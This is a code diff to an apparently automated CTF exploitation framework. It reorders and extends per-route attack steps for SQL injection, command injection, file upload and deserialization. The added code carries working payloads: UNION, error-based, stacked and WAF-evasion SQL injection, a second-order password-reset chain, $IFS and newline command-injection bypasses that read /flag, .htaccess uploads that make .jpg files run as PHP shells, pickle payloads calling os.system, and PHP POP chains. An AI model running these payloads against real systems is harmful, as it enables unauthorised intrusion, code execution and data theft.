@@ -297,11 +297,20 @@ class RouteStateMachine(ABC):
             # Skip if prefix is a common CSS/JS keyword
             if prefix.lower() in _CSS_JS_PREFIXES:
                 continue
+            # Skip if prefix contains underscore (real flag prefixes are simple words)
+            if "_" in prefix:
+                continue
             # Skip if content looks like CSS (contains colons + semicolons)
             if content.count(":") >= 2 and content.count(";") >= 2:
                 continue
             # Skip if content contains newlines (CSS blocks span multiple lines)
             if "\n" in content or "\r" in content:
+                continue
+            # Skip if content contains path separators (not a real flag)
+            if "/" in content or "\\" in content:
+                continue
+            # Skip if content starts with '{' (nested braces — template/CSS artifact)
+            if content.startswith("{"):
                 continue
             # AI validation for ambiguous loose matches
             candidate = m.group(0)
@@ -447,16 +456,19 @@ class RouteStateMachine(ABC):
     def run_exploit(self) -> Tuple[bool, Optional[str]]:
         """Run exploit steps. Returns (found_flag, flag_value).
 
+        Uses get_exploit_steps_with_fast_track() to prepend fast-track payloads
+        from historical experience before normal exploit steps.
+
         Safety limits:
           - Max 20 steps per route (prevents 100+ step routes from blocking)
           - Max 30 seconds total per route (prevents slow targets from hanging)
           - Individual HTTP timeout is 8 seconds (not 15)
         """
-        MAX_STEPS_PER_ROUTE = 30
+        MAX_STEPS_PER_ROUTE = 50
         MAX_TIME_PER_ROUTE = 30.0
         route_start = time.time()
 
-        all_steps = self.get_exploit_steps()
+        all_steps = self.get_exploit_steps_with_fast_track()
         # Cap the number of steps to prevent excessive HTTP requests
         capped_steps = all_steps[:MAX_STEPS_PER_ROUTE]
 
@@ -488,6 +500,11 @@ class RouteStateMachine(ABC):
                 step.status = StepStatus.SUCCESS
                 step.result_summary = f"HTTP {resp.status_code}, {len(resp.text)} bytes"
 
+                # Task 9.6: Record source for fast-track steps
+                source = step_def.get("source", "")
+                if source:
+                    step.result_summary += f" [source={source}]"
+
                 # Check for flag
                 flag = self._check_flag(resp.text)
                 if flag:
@@ -516,6 +533,105 @@ class RouteStateMachine(ABC):
         if not self.state.stop_reason:
             self.state.stop_reason = "exploit_chain_complete"
         return False, None
+
+    # ------------------------------------------------------------------
+    # Task 9: Fast-track payload support
+    # ------------------------------------------------------------------
+
+    def get_exploit_steps_with_fast_track(
+        self,
+        knowledge_path: Optional["Path"] = None,
+        fast_track_max_payloads: int = 3,
+        min_score_threshold: float = 0.3,
+    ) -> List[Dict[str, Any]]:
+        """Get exploit steps with fast-track payloads prepended.
+
+        Task 9.1: Base class method that combines fast-track payloads from
+        historical experience with normal exploit steps.
+
+        Task 9.3: Fast payloads go before normal exploit_steps, limited by
+        fast_track_max_payloads.
+
+        Task 9.4: Fast payloads only enabled if the current route's best
+        evidence score >= min_score_threshold (or fingerprint matches).
+        This prevents cross-challenge misreplay.
+
+        Args:
+            knowledge_path: Path to ctf_knowledge.json. If None, uses default.
+            fast_track_max_payloads: Maximum number of fast-track payloads to
+                prepend (default 3).
+            min_score_threshold: Minimum evidence score required to enable
+                fast-track payloads (default 0.3).
+
+        Returns:
+            Combined list: fast-track steps (if enabled) + normal exploit steps.
+        """
+        normal_steps = self.get_exploit_steps()
+
+        # Task 9.4: Check if fast-track should be enabled
+        best_evidence = max(
+            (s.score for s in self.state.evidence_scores), default=0.0
+        )
+        if best_evidence < min_score_threshold:
+            # Score too low — skip fast-track to avoid cross-challenge misreplay
+            return normal_steps
+
+        # Task 9.2: Load fast payloads from unified schema
+        fast_payloads = self._load_fast_payloads(knowledge_path)
+        if not fast_payloads:
+            return normal_steps
+
+        # Task 9.3: Limit and prepend fast-track steps
+        limited_payloads = fast_payloads[:fast_track_max_payloads]
+        fast_steps: List[Dict[str, Any]] = []
+
+        for i, payload in enumerate(limited_payloads):
+            fast_steps.append({
+                "name": f"fast_track_{i}",
+                "description": f"Historical success payload #{i + 1} (experience fast-track)",
+                "method": payload.get("method", "GET"),
+                "path": payload.get("path", "/"),
+                "params": payload.get("params"),
+                "data": payload.get("data"),
+                "headers": payload.get("headers", {}),
+                "source": "experience_fast_track",
+            })
+
+        return fast_steps + normal_steps
+
+    def _load_fast_payloads(
+        self, knowledge_path: Optional["Path"] = None
+    ) -> List[Dict[str, Any]]:
+        """Load fast-track payloads for this route from the unified knowledge schema.
+
+        Task 9.2: Reads from ctf_knowledge.json's `fast_payloads` field,
+        keyed by route name.
+
+        Graceful degradation: returns empty list on any error (file missing,
+        corrupt JSON, missing field, etc.).
+
+        Args:
+            knowledge_path: Path to ctf_knowledge.json. If None, uses default.
+
+        Returns:
+            List of payload template dicts for this route, or empty list.
+        """
+        try:
+            from pathlib import Path as _Path
+            from autopnex.ctf.knowledge_schema import load_knowledge
+
+            path = _Path(knowledge_path) if knowledge_path else None
+            knowledge = load_knowledge(path)
+            fast_payloads = knowledge.get("fast_payloads", {})
+            route_payloads = fast_payloads.get(self.route, [])
+
+            if not isinstance(route_payloads, list):
+                return []
+
+            return route_payloads
+        except Exception:
+            # Graceful degradation — never block exploit execution
+            return []
 
     def get_last_request_info(self) -> Tuple[str, str]:
         """Return (last_request_url, last_response_excerpt) from HTTP history."""
@@ -1525,109 +1641,10 @@ class SQLiMachine(RouteStateMachine):
         base_path = urlparse(self.target_url).path or "/"
         steps = []
 
-        # --- Login form SQL injection (top 3 attempts only) ---
-        # Quick check: try the most common login bypass on /check.php and base path
-        for lpath in ["/check.php", base_path, "/login.php"]:
-            steps.append({
-                "name": f"login_{lpath.strip('/').replace('.','_') or 'root'}",
-                "description": f"登录万能密码 {lpath}",
-                "method": "GET",
-                "path": lpath,
-                "params": {"username": "admin' or '1'='1", "password": "admin' or '1'='1"},
-                "extract_flag": True,
-            })
-
-        # --- Stacked SQL (POST query=*,1) — must be early for SUCTF EasySQL ---
-        for sp in ["*,1", "1;set sql_mode=PIPES_AS_CONCAT;select 1"]:
-            steps.append({
-                "name": f"stacked_{hash(sp) & 0xffff:x}",
-                "description": f"堆叠注入 POST query={sp}",
-                "method": "POST",
-                "path": base_path,
-                "data": f"query={sp}",
-                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-                "extract_flag": True,
-            })
-
-        # Always try the most common payloads first regardless of detected type
-        # This ensures we hit the benchmark challenges even without perfect detection
-
-        # --- Handler/rename bypass for stacked injection (强网杯/GYCTF style) ---
-        handler_payloads = [
-            "1';handler Flag open;handler Flag read first;",
-            "1';handler FlagHere open;handler FlagHere read first;",
-            "1';handler flag open;handler flag read first;",
-            "1';alter table Flag rename to a;alter table a rename to Flag;",
-        ]
-        for hp in handler_payloads:
-            steps.append({
-                "name": f"handler_post_{hash(hp) & 0xffff:x}",
-                "description": f"Handler绕过 POST inject={hp[:40]}",
-                "method": "POST",
-                "path": base_path,
-                "data": f"inject={hp}",
-                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-                "extract_flag": True,
-            })
-
-        # --- Double-write bypass (BabySQL style) ---
-        double_write_payloads = [
-            ("admin' oorr '1'='1", "admin' oorr '1'='1"),
-            ("' ununionion seselectlect 1,2,3-- -", "' ununionion seselectlect 1,2,3-- -"),
-        ]
-        for dw_user, dw_pass in double_write_payloads:
-            steps.append({
-                "name": f"doublewrite_{hash(dw_user) & 0xffff:x}",
-                "description": f"双写绕过: {dw_user[:30]}",
-                "method": "GET",
-                "path": "/check.php",
-                "params": {"username": dw_user, "password": dw_pass},
-                "extract_flag": True,
-            })
-
-        # --- Error-based injection on login forms (HardSQL style) ---
-        error_payloads = [
-            "admin'or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e)))#",
-            "admin'or(updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1))#",
-        ]
-        for ep in error_payloads:
-            steps.append({
-                "name": f"error_login_{hash(ep) & 0xffff:x}",
-                "description": f"报错注入 /check.php: {ep[:40]}",
-                "method": "GET",
-                "path": "/check.php",
-                "params": {"username": "admin", "password": ep},
-                "extract_flag": True,
-            })
-
-        # --- Cookie/auth bypass (BuyFlag style) ---
-        steps.append({
-            "name": "buyflag_cookie_bypass",
-            "description": "Cookie user=1 + POST password=404&money[]=100000000",
-            "method": "POST",
-            "path": "/pay.php",
-            "data": "password=404&money[]=100000000",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Cookie": "user=1",
-            },
-            "extract_flag": True,
-        })
-
-        # --- MD5 raw output bypass (ffifdyop) ---
-        steps.append({
-            "name": "md5_raw_ffifdyop",
-            "description": "md5($pass,true) 绕过: ffifdyop",
-            "method": "GET",
-            "path": base_path,
-            "params": {"password": "ffifdyop"},
-            "extract_flag": True,
-        })
-
-        # Always try the most common payloads first regardless of detected type
-        # This ensures we hit the benchmark challenges even without perfect detection
-
-        # UNION-based payloads (most common in CTF)
+        # ===================================================================
+        # PRIORITY 1: Basic UNION SELECT payloads (most common CTF pattern)
+        # These MUST be in the first 10 steps to solve strict benchmarks.
+        # ===================================================================
         steps.extend([
             {
                 "name": "union_extract_flag_3col",
@@ -1655,28 +1672,9 @@ class SQLiMachine(RouteStateMachine):
             },
         ])
 
-        # Error-based extraction
-        if self._injection_type == "error_based":
-            steps.append({
-                "name": "error_extract",
-                "description": "报错注入提取数据",
-                "method": "GET",
-                "path": base_path,
-                "params": {param: "' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flag LIMIT 1)))-- -"},
-                "extract_flag": True,
-            })
-
-        # Additional UNION with information_schema
-        steps.append({
-            "name": "union_extract_tables",
-            "description": "UNION 提取表名",
-            "method": "GET",
-            "path": base_path,
-            "params": {param: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"},
-            "extract_flag": True,
-        })
-
-        # Boolean-based / OR true payloads
+        # ===================================================================
+        # PRIORITY 2: OR true / boolean blind (solves sqli_blind benchmark)
+        # ===================================================================
         steps.extend([
             {
                 "name": "or_true_simple",
@@ -1704,9 +1702,9 @@ class SQLiMachine(RouteStateMachine):
             },
         ])
 
-        # Quote-less UNION payloads — some challenges branch on the presence
-        # of a quote (returning an SQL error page instead of the UNION result),
-        # so we try plain UNION SELECT without a leading quote.
+        # ===================================================================
+        # PRIORITY 3: Quote-less UNION payloads (numeric injection)
+        # ===================================================================
         steps.extend([
             {
                 "name": "union_noquote_3col",
@@ -1726,8 +1724,145 @@ class SQLiMachine(RouteStateMachine):
             },
         ])
 
-        # Time-based blind SLEEP payloads — some toy targets simply check for
-        # the keyword "SLEEP" in the value and return the flag directly.
+        # ===================================================================
+        # PRIORITY 4: Login form SQL injection
+        # ===================================================================
+        for lpath in ["/check.php", base_path, "/login.php"]:
+            steps.append({
+                "name": f"login_{lpath.strip('/').replace('.','_') or 'root'}",
+                "description": f"登录万能密码 {lpath}",
+                "method": "GET",
+                "path": lpath,
+                "params": {"username": "admin' or '1'='1", "password": "admin' or '1'='1"},
+                "extract_flag": True,
+            })
+
+        # ===================================================================
+        # PRIORITY 5: Second-order SQL injection chain (multi-step)
+        # Must be before WAF bypass since it requires multiple HTTP requests.
+        # ===================================================================
+        second_order_usernames = [
+            "admin'--",
+            "admin'-- ",
+        ]
+        for so_user in second_order_usernames:
+            safe_name = so_user.replace("'", "q").replace("-", "d").replace(" ", "").replace("#", "h")[:10]
+            steps.append({
+                "name": f"so_register_{safe_name}",
+                "description": f"Second-order: register user={so_user}",
+                "method": "POST",
+                "path": "/register",
+                "data": {"username": so_user, "password": "test123"},
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": False,
+            })
+            steps.append({
+                "name": f"so_login_{safe_name}",
+                "description": f"Second-order: login as {so_user}",
+                "method": "POST",
+                "path": "/login",
+                "data": {"username": so_user, "password": "test123"},
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": False,
+            })
+            steps.append({
+                "name": f"so_changepw_{safe_name}",
+                "description": f"Second-order: change password",
+                "method": "POST",
+                "path": "/change_password",
+                "data": {"new_password": "hacked"},
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": False,
+            })
+            steps.append({
+                "name": f"so_admin_login_{safe_name}",
+                "description": f"Second-order: login as admin",
+                "method": "POST",
+                "path": "/login",
+                "data": {"username": "admin", "password": "hacked"},
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": True,
+            })
+            steps.append({
+                "name": f"so_profile_{safe_name}",
+                "description": f"Second-order: GET /profile as admin",
+                "method": "GET",
+                "path": "/profile",
+                "extract_flag": True,
+            })
+
+        # ===================================================================
+        # PRIORITY 6: Stacked SQL (POST query=*,1) — for SUCTF EasySQL
+        # ===================================================================
+        for sp in ["*,1", "1;set sql_mode=PIPES_AS_CONCAT;select 1"]:
+            steps.append({
+                "name": f"stacked_{hash(sp) & 0xffff:x}",
+                "description": f"堆叠注入 POST query={sp}",
+                "method": "POST",
+                "path": base_path,
+                "data": f"query={sp}",
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": True,
+            })
+
+        # ===================================================================
+        # PRIORITY 6: WAF bypass (mixed-case and inline-comment evasion)
+        # ===================================================================
+        waf_bypass_payloads = [
+            # Mixed-case UNION SELECT
+            "1' uNiOn SeLeCt 1,2,3,secret FROM users-- -",
+            "1' uNiOn SeLeCt 1,flag,3 FROM flag-- -",
+            "' uNiOn SeLeCt 1,2,3,secret FROM users-- -",
+            "' uNiOn SeLeCt 1,flag,3 FROM flag-- -",
+            # Inline comment split keywords
+            "1' UN/**/ION SEL/**/ECT 1,2,3,secret FROM users-- -",
+            "1' UN/**/ION SEL/**/ECT 1,flag,3 FROM flag-- -",
+            "' UN/**/ION SEL/**/ECT 1,2,3,secret FROM users-- -",
+            # Mixed-case OR tautology
+            "' Or 1=1-- -",
+            "' oR '1'='1'-- -",
+            "1' oR 1=1-- -",
+            # Mixed-case with different column counts
+            "' uNiOn SeLeCt 1,2,3-- -",
+            "' uNiOn SeLeCt 1,2-- -",
+            "' uNiOn SeLeCt 1-- -",
+        ]
+        for i, waf_p in enumerate(waf_bypass_payloads):
+            steps.append({
+                "name": f"waf_bypass_{i}",
+                "description": f"WAF绕过 (大小写/注释): {waf_p[:40]}",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: waf_p},
+                "extract_flag": True,
+            })
+
+        # ===================================================================
+        # PRIORITY 7: Advanced techniques (handler, double-write, error-based)
+        # ===================================================================
+
+        # Error-based extraction
+        if self._injection_type == "error_based":
+            steps.append({
+                "name": "error_extract",
+                "description": "报错注入提取数据",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flag LIMIT 1)))-- -"},
+                "extract_flag": True,
+            })
+
+        # Additional UNION with information_schema
+        steps.append({
+            "name": "union_extract_tables",
+            "description": "UNION 提取表名",
+            "method": "GET",
+            "path": base_path,
+            "params": {param: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"},
+            "extract_flag": True,
+        })
+
+        # Time-based blind SLEEP payloads
         steps.extend([
             {
                 "name": "sleep_mysql",
@@ -1747,8 +1882,81 @@ class SQLiMachine(RouteStateMachine):
             },
         ])
 
-        # If using default param name, also try common alternative param names
-        # This handles challenges where the param name wasn't detected
+        # Handler/rename bypass for stacked injection (强网杯/GYCTF style)
+        handler_payloads = [
+            "1';handler Flag open;handler Flag read first;",
+            "1';handler FlagHere open;handler FlagHere read first;",
+            "1';handler flag open;handler flag read first;",
+            "1';alter table Flag rename to a;alter table a rename to Flag;",
+        ]
+        for hp in handler_payloads:
+            steps.append({
+                "name": f"handler_post_{hash(hp) & 0xffff:x}",
+                "description": f"Handler绕过 POST inject={hp[:40]}",
+                "method": "POST",
+                "path": base_path,
+                "data": f"inject={hp}",
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": True,
+            })
+
+        # Double-write bypass (BabySQL style)
+        double_write_payloads = [
+            ("admin' oorr '1'='1", "admin' oorr '1'='1"),
+            ("' ununionion seselectlect 1,2,3-- -", "' ununionion seselectlect 1,2,3-- -"),
+        ]
+        for dw_user, dw_pass in double_write_payloads:
+            steps.append({
+                "name": f"doublewrite_{hash(dw_user) & 0xffff:x}",
+                "description": f"双写绕过: {dw_user[:30]}",
+                "method": "GET",
+                "path": "/check.php",
+                "params": {"username": dw_user, "password": dw_pass},
+                "extract_flag": True,
+            })
+
+        # Error-based injection on login forms (HardSQL style)
+        error_payloads = [
+            "admin'or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e)))#",
+            "admin'or(updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1))#",
+        ]
+        for ep in error_payloads:
+            steps.append({
+                "name": f"error_login_{hash(ep) & 0xffff:x}",
+                "description": f"报错注入 /check.php: {ep[:40]}",
+                "method": "GET",
+                "path": "/check.php",
+                "params": {"username": "admin", "password": ep},
+                "extract_flag": True,
+            })
+
+        # Cookie/auth bypass (BuyFlag style)
+        steps.append({
+            "name": "buyflag_cookie_bypass",
+            "description": "Cookie user=1 + POST password=404&money[]=100000000",
+            "method": "POST",
+            "path": "/pay.php",
+            "data": "password=404&money[]=100000000",
+            "headers": {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Cookie": "user=1",
+            },
+            "extract_flag": True,
+        })
+
+        # MD5 raw output bypass (ffifdyop)
+        steps.append({
+            "name": "md5_raw_ffifdyop",
+            "description": "md5($pass,true) 绕过: ffifdyop",
+            "method": "GET",
+            "path": base_path,
+            "params": {"password": "ffifdyop"},
+            "extract_flag": True,
+        })
+
+        # ===================================================================
+        # PRIORITY 8: Alternative param names
+        # ===================================================================
         alt_params = [
             "q", "user_id", "id", "search", "query", "uid", "item",
             "product_id", "product", "cat", "category",
@@ -1793,8 +2001,6 @@ class SQLiMachine(RouteStateMachine):
                 "params": {alt: "1 OR '1'='1"},
                 "extract_flag": True,
             })
-
-        # (Login form and stacked SQL steps are at the top of the list)
 
         return steps
 
@@ -1925,9 +2131,9 @@ class CMDiMachine(RouteStateMachine):
 
         steps = []
 
-        # Newline bypass first (works when ; | & are blocked)
-        # Use actual newline character \n — requests will URL-encode it to %0a
-        # which parse_qs will decode back to \n on the server side
+        # ===================================================================
+        # PRIORITY 1: Newline bypass with primary param (most common filter bypass)
+        # ===================================================================
         if method == "POST":
             steps.append({
                 "name": "cat_flag_newline",
@@ -1963,38 +2169,36 @@ class CMDiMachine(RouteStateMachine):
                 "extract_flag": True,
             })
 
-        # --- $IFS space bypass (Ping Ping Ping style) — early position ---
-        # This is one of the most common CTF patterns: spaces blocked, use $IFS
-        ifs_payloads = [
-            "127.0.0.1;cat$IFS$9flag.php",
-            "127.0.0.1;cat${IFS}flag.php",
-            "127.0.0.1;cat$IFS/flag",
-            "127.0.0.1;cat$IFS$9/flag",
-        ]
-        for ifs_p in ifs_payloads:
+        # ===================================================================
+        # PRIORITY 2: Newline bypass with common alt params (host, ip, cmd)
+        # These must be early to solve cmdi_filter benchmark (host param).
+        # ===================================================================
+        alt_cmdi_params = ["host", "ip", "cmd", "target", "addr", "ping"]
+        for alt in alt_cmdi_params:
+            if alt == param:
+                continue
+            # Newline bypass with alternative param
             steps.append({
-                "name": f"ifs_{param}_{hash(ifs_p) & 0xffff:x}",
-                "description": f"$IFS空格绕过 ({param}): {ifs_p[:35]}",
+                "name": f"cat_flag_newline_alt_{alt}",
+                "description": f"换行符绕过 (参数: {alt})",
                 "method": method,
                 "path": path,
-                "params" if method == "GET" else "data": {param: ifs_p},
+                "params" if method == "GET" else "data": {alt: "127.0.0.1\ncat flag.txt", **({"Submit": "Submit"} if method != "GET" else {})},
+                "extract_flag": True,
+            })
+            # Also try cat /flag
+            steps.append({
+                "name": f"cat_flag_newline_abs_alt_{alt}",
+                "description": f"换行符绕过 cat /flag (参数: {alt})",
+                "method": method,
+                "path": path,
+                "params" if method == "GET" else "data": {alt: "127.0.0.1\ncat /flag", **({"Submit": "Submit"} if method != "GET" else {})},
                 "extract_flag": True,
             })
 
-        # $IFS payloads with 'ip' param (PingPingPing pattern)
-        # This ensures the target is hit even if param detection picks a different name.
-        if param != "ip":
-            for ifs_p in ifs_payloads:
-                steps.append({
-                    "name": f"ifs_ip_{hash(ifs_p) & 0xffff:x}",
-                    "description": f"$IFS空格绕过 (ip): {ifs_p[:35]}",
-                    "method": method,
-                    "path": path,
-                    "params" if method == "GET" else "data": {"ip": ifs_p},
-                    "extract_flag": True,
-                })
-
-        # Standard separators
+        # ===================================================================
+        # PRIORITY 3: Standard separators (; | && etc.) with primary param
+        # ===================================================================
         separators = [";", "|", "`", "$()", "&&", "||"]
         for sep in separators:
             if sep == "$()":
@@ -2024,31 +2228,79 @@ class CMDiMachine(RouteStateMachine):
                     "extract_flag": True,
                 })
 
-        # Alternative param names (common CMDi parameter names)
-        alt_cmdi_params = ["host", "ip", "cmd", "target", "addr", "ping"]
-        for alt in alt_cmdi_params:
-            if alt == param:
-                continue
-            # Newline bypass with alternative param
+        # ===================================================================
+        # PRIORITY 4: $IFS space bypass (Ping Ping Ping style)
+        # ===================================================================
+        ifs_payloads = [
+            "127.0.0.1;cat$IFS$9flag.php",
+            "127.0.0.1;cat${IFS}flag.php",
+            "127.0.0.1;cat$IFS/flag",
+            "127.0.0.1;cat$IFS$9/flag",
+            "127.0.0.1;cat${IFS}/flag",
+            "{cat,/flag}",
+        ]
+        for ifs_p in ifs_payloads:
             steps.append({
-                "name": f"cat_flag_newline_alt_{alt}",
-                "description": f"换行符绕过 (参数: {alt})",
+                "name": f"ifs_{param}_{hash(ifs_p) & 0xffff:x}",
+                "description": f"$IFS空格绕过 ({param}): {ifs_p[:35]}",
                 "method": method,
                 "path": path,
-                "params" if method == "GET" else "data": {alt: "127.0.0.1\ncat flag.txt", **({"Submit": "Submit"} if method != "GET" else {})},
-                "extract_flag": True,
-            })
-            # Also try cat /flag
-            steps.append({
-                "name": f"cat_flag_newline_abs_alt_{alt}",
-                "description": f"换行符绕过 cat /flag (参数: {alt})",
-                "method": method,
-                "path": path,
-                "params" if method == "GET" else "data": {alt: "127.0.0.1\ncat /flag", **({"Submit": "Submit"} if method != "GET" else {})},
+                "params" if method == "GET" else "data": {param: ifs_p},
                 "extract_flag": True,
             })
 
-        # Alternative read methods
+        # $IFS payloads with 'ip' param (PingPingPing pattern)
+        if param != "ip":
+            for ifs_p in ifs_payloads:
+                steps.append({
+                    "name": f"ifs_ip_{hash(ifs_p) & 0xffff:x}",
+                    "description": f"$IFS空格绕过 (ip): {ifs_p[:35]}",
+                    "method": method,
+                    "path": path,
+                    "params" if method == "GET" else "data": {"ip": ifs_p},
+                    "extract_flag": True,
+                })
+
+        # ===================================================================
+        # PRIORITY 5: /ping endpoint variants
+        # ===================================================================
+        ping_space_bypass_payloads = [
+            "127.0.0.1;cat${IFS}/flag",
+            "127.0.0.1;cat$IFS$9/flag",
+            "127.0.0.1;cat$IFS/flag",
+            "{cat,/flag}",
+            "127.0.0.1|cat${IFS}/flag",
+            "127.0.0.1|cat$IFS$9/flag",
+            "127.0.0.1&&cat${IFS}/flag",
+            "127.0.0.1;cat${IFS}flag.txt",
+            "127.0.0.1;cat$IFS$9flag.txt",
+            "127.0.0.1\tcat\t/flag",
+        ]
+        for ping_param in ("cmd", "ip"):
+            for ping_p in ping_space_bypass_payloads:
+                # GET /ping?cmd=...
+                steps.append({
+                    "name": f"ping_get_{ping_param}_{hash(ping_p) & 0xffff:x}",
+                    "description": f"GET /ping 空格绕过 ({ping_param}): {ping_p[:30]}",
+                    "method": "GET",
+                    "path": "/ping",
+                    "params": {ping_param: ping_p},
+                    "extract_flag": True,
+                })
+                # POST /ping cmd=...
+                steps.append({
+                    "name": f"ping_post_{ping_param}_{hash(ping_p) & 0xffff:x}",
+                    "description": f"POST /ping 空格绕过 ({ping_param}): {ping_p[:30]}",
+                    "method": "POST",
+                    "path": "/ping",
+                    "data": {ping_param: ping_p},
+                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                    "extract_flag": True,
+                })
+
+        # ===================================================================
+        # PRIORITY 6: Alternative read methods and non-alpha RCE
+        # ===================================================================
         alt_data = {param: "127.0.0.1;cat /flag.txt", "Submit": "Submit"}
         if method == "POST":
             steps.append({
@@ -2069,10 +2321,8 @@ class CMDiMachine(RouteStateMachine):
                 "extract_flag": True,
             })
 
-        # --- Non-alpha RCE (XOR/NOT bypass for preg_match letter filter) ---
-        # These payloads use ^ and ~ operators to construct commands without letters
+        # Non-alpha RCE (XOR/NOT bypass for preg_match letter filter)
         non_alpha_payloads = [
-            # XOR-based: construct "system" from non-alpha chars
             '("^"@[")("## ^"@[@@")',
             '(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98)',
             '${%ff%ff%ff%ff^%a0%b8%ba%ab}(${%ff%ff%ff%ff^%a0%b8%ba%ab})',
@@ -2545,6 +2795,34 @@ class UploadMachine(RouteStateMachine):
             "path": "/uploads/shell.txt",
             "extract_flag": True,
         })
+
+        # ---- Variant C2: .htaccess two-step with .jpg extension ----
+        # Upload .htaccess that maps .jpg to PHP, then upload shell.jpg
+        htaccess_jpg = b"AddType application/x-httpd-php .jpg\nAddHandler application/x-httpd-php .jpg\n"
+        steps.append({
+            "name": "htaccess_jpg_step1",
+            "description": "Step 1: 上传 .htaccess (AddType .jpg → PHP)",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"file": (".htaccess", htaccess_jpg, "text/plain")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "htaccess_jpg_step2",
+            "description": "Step 2: 上传 shell.jpg 携带 PHP 内容",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"file": ("shell.jpg", php_payload, "image/jpeg")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "htaccess_jpg_access",
+            "description": "访问 /uploads/shell.jpg 通过 .htaccess 触发 PHP",
+            "method": "GET",
+            "path": "/uploads/shell.jpg",
+            "extract_flag": True,
+        })
+
         # Some upload challenges accept .htaccess via the alternative field "image"
         steps.append({
             "name": "htaccess_step1_image",
@@ -2569,6 +2847,89 @@ class UploadMachine(RouteStateMachine):
             "path": "/uploads/shell.txt",
             "extract_flag": True,
         })
+
+        # ---- Variant C3: .htaccess .jpg via image field ----
+        steps.append({
+            "name": "htaccess_jpg_step1_image",
+            "description": "Step 1 (image 字段): 上传 .htaccess (AddType .jpg)",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"image": (".htaccess", htaccess_jpg, "text/plain")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "htaccess_jpg_step2_image",
+            "description": "Step 2 (image 字段): 上传 shell.jpg",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"image": ("shell.jpg", php_payload, "image/jpeg")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "htaccess_jpg_access_image",
+            "description": "访问 /uploads/shell.jpg (image 字段路径)",
+            "method": "GET",
+            "path": "/uploads/shell.jpg",
+            "extract_flag": True,
+        })
+
+        # --- Pickle/Deserialization RCE ---
+        # For Python targets that accept serialized data via POST /submit
+        # The pickle payload contains cos\nsystem\n opcode to execute commands
+        import base64 as _b64
+        pickle_payloads = [
+            # cos\nsystem\n(S'cat /flag'\ntR.
+            _b64.b64encode(b"cos\nsystem\n(S'cat /flag'\ntR.").decode(),
+            # cos\nsystem\n(S'cat /etc/flag'\ntR.
+            _b64.b64encode(b"cos\nsystem\n(S'cat /etc/flag'\ntR.").decode(),
+            # cos\nsystem\n(S'id'\ntR.
+            _b64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
+            # cos\nsystem\n(S'cat /flag.txt'\ntR.
+            _b64.b64encode(b"cos\nsystem\n(S'cat /flag.txt'\ntR.").decode(),
+        ]
+        for i, pkl_payload in enumerate(pickle_payloads):
+            # POST as form data with data= parameter
+            steps.append({
+                "name": f"pickle_rce_form_{i}",
+                "description": f"Pickle RCE: POST /submit with data={pkl_payload[:30]}...",
+                "method": "POST",
+                "path": "/submit",
+                "data": {"data": pkl_payload},
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": True,
+            })
+            # POST as raw body
+            steps.append({
+                "name": f"pickle_rce_raw_{i}",
+                "description": f"Pickle RCE: POST /submit raw body",
+                "method": "POST",
+                "path": "/submit",
+                "data": pkl_payload,
+                "headers": {"Content-Type": "application/octet-stream"},
+                "extract_flag": True,
+            })
+            # POST as JSON with data field
+            steps.append({
+                "name": f"pickle_rce_json_{i}",
+                "description": f"Pickle RCE: POST /submit JSON data field",
+                "method": "POST",
+                "path": "/submit",
+                "json": {"data": pkl_payload},
+                "headers": {"Content-Type": "application/json"},
+                "extract_flag": True,
+            })
+
+        # Also try pickle on /api/deserialize and /api/load endpoints
+        for deser_path in ["/api/deserialize", "/api/load", "/deserialize", "/pickle"]:
+            steps.append({
+                "name": f"pickle_rce_{deser_path.strip('/').replace('/', '_')}",
+                "description": f"Pickle RCE on {deser_path}",
+                "method": "POST",
+                "path": deser_path,
+                "data": {"data": pickle_payloads[0]},
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": True,
+            })
 
         return steps
 
@@ -2657,6 +3018,33 @@ class PHPPopMachine(RouteStateMachine):
         # notes so the agent (or a human reviewer) can switch to a real chain
         # generator when needed.
         steps: List[Dict[str, Any]] = []
+
+        # ---- PHP POP chain payloads for /unserialize endpoint ----
+        # De1CTF-style: FileReader.__destruct → Formatter.__toString → Logger.__call → file_get_contents("/flag")
+        pop_payloads = [
+            'O:10:"FileReader":1:{s:6:"reader";O:9:"Formatter":1:{s:7:"handler";O:6:"Logger":1:{s:4:"file";s:5:"/flag";}}}',
+            'O:10:"FileReader":1:{s:6:"reader";O:9:"Formatter":1:{s:7:"handler";O:6:"Logger":1:{s:4:"file";s:9:"/flag.txt";}}}',
